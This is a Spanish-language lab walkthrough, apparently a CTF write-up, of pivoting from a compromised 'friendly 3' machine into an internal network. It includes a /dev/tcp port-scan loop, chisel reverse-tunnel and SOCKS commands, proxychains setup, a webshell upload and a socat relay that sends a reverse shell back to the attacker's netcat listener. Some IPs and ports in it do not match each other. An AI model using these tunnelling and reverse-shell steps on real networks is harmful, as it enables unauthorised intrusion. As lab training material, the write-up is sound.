Una vez dentro de la máquina friendly 3 vemos que tenemos la otra interfaz de red que se conecta con la siguiente máquina:
![[Pasted image 20230813134718.png]]
Vamos a encontrar hosts que estén dentro de esa interfaz 10.10.10.5/24, por tanto creamos un script de bash que vaya haciendo un ping a cada uno de los host dentro del rango de red y los puertos abiertos:
```bash
#!/bin/bash

for i in $(seq 1 254); do
        for port in  21 22 80 443 445 8080; do
                timeout 1 bash -c "echo '' > /dev/tcp/10.10.10.$i/$port" &>/dev/null && echo "[+] Host 10.10.10.$i - PORT $port - OPEN" &
        done
done; wait
```
Y vemos que nos encuentra estos hosts, donde la .5 somos nosotros, y la .4 es el objetivo:
![[Pasted image 20230813164756.png]]
De todos modos, si queremos llegar a la 10.10.10.4 desde nuestra máquina atacante, tenemos que usar chisel:
![[Pasted image 20230813135914.png]]
Nos lo descargamos:
![[Pasted image 20230813140022.png]]
Nos lo compartimos primero con la máquina friendly3:
![[Pasted image 20230813140205.png]]
![[Pasted image 20230813140218.png]]
Por tanto, desde la máquina atacante abrimos un servidor con chisel para recibir la conexiones entrantes:
```bash
./chisel_1.8.1_linux_amd64 server --reverse -p 1234
```
![[Pasted image 20230813140452.png]]
Y ahora en la máquina víctima ejecutamos este otro comando para recibir el puerto 80 de la máquina objetivo dentro del 1234 de nuestra máquina atacante:
```bash
./chisel client 192.168.0.30:1234 R:80:10.10.10.6:80
```
![[Pasted image 20230813165106.png]]
![[Pasted image 20230813165051.png]]
De tal forma que ahora nuestro puerto 80 va a ser el puerto 80 de la máquina objetivo:
![[Pasted image 20230813165142.png]]
Pero lo ideal sería poder traernos todos los puertos en lugar de hacerlo uno a uno, por lo que usaremos un socks con este parámetro:
```bash
./chisel client 192.168.0.30:1234 R:socks
```
![[Pasted image 20230813162111.png]]
Donde crearemos un tunel por el puerto 1080, el cual se utiliza por defecto:
![[Pasted image 20230813162132.png]]
Y ahora nos abrimos el fichero proxychains4.conf:
```bash
nano /etc/proxychains4.conf
```
Y tenemos que asegurarnos que esta línea esté descomentada:
![[Pasted image 20230813162427.png]]
Y en la parte de debajo del todo tenemos que escribir lo siguiente, que será nuestra propia IP por el tunel que está dentro del puerto 1080:
![[Pasted image 20230813162536.png]]
Y ahora si hacemos un escaneo de nmap pasando por el proxychains, vamos a poder realizar correctamente este escaneo:
![[Pasted image 20230813165257.png]]
Lo mismo ocurriría si queremos ejecutar un whatweb o cualquier otra herramienta, ya que tenemos que pasarla primero por el túnel del proxychains:
![[Pasted image 20230813165318.png]]
Pero en el navegador, si queremos visualizar el puerto 80, tendremos que pasarle el proxy de la siguiente forma:
![[Pasted image 20230813163455.png]]
Y ya podremos visualizar el puerto 80 de la máquina sin problema:
![[Pasted image 20230813165400.png]]
Lo mismo haríamos por ejemplo si queremos acceder vía ftp, donde le pasaremos primero el túnel del proxychains:
![[Pasted image 20230813165515.png]]
Por otra parte, si quisiéramos hacer fuzzing, tendríamos que pasar también por el proxychains o utilizar parámetros específicos de gobuster o la herramienta que estemos usando, por lo que lo haríamos de esta forma:
```bash
gobuster dir -u http://10.10.10.6 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt --proxy socks5://127.0.0.1:1080
```
![[Pasted image 20230813165642.png]]
Vamos a hacer la intrusión donde debemos de subir la webshell a la máquina víctima para enviarnos la reverse shell:
![[Pasted image 20230813165756.png]]
Y ahora la IP que debemos poner para recibir la reverse shell debe ser la de la máquina intermedia donde se estará ejecutando socat:
![[Pasted image 20230816155814.png]]
Y la subimos:
![[Pasted image 20230813170102.png]]
De todos modos, para recibir la reverse shell tendremos que usar socat, por lo que lo vamos a descargar:
![[Pasted image 20230816160137.png]]
Y ahora este binario de socat nos lo compartimos con la máquina friendly 3:
![[Pasted image 20230813170304.png]]
Y deste otra ventana de la friendly 3 nos lo descargamos:
![[Pasted image 20230813170551.png]]
Ahora ejecutamos el socat en la máquina intermedia, mandando al puerto 443 de la máquina atacante todo el tráfico recibido por el puerto 4343 de la máquina intermedia:
```bash
./socat tcp-l:443,fork,reuseaddr tcp:192.168.0.30:443
```
![[Pasted image 20230816160350.png]]
Y ahora si escuchamos con netcat, habremos recibido la conexión al haber llamado al fichero php malicioso desde el navegador:
![[Pasted image 20230816160418.png]]
![[Pasted image 20230816160429.png]]



